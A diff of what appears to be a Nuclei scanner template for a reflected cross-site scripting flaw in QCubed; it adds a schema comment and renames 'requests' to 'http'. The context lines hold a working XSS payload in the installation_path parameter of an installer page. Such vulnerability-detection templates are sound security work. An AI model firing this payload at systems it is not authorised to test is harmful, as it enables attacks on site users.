@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: qcubed-xss1
 
 info:
@@ -8,7 +9,7 @@ info:
   tags: xss,qcubed
 
 
-requests:
+http:
   - raw:
       - |
         GET /assets/php/_devtools/installer/step_2.php?installation_path=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
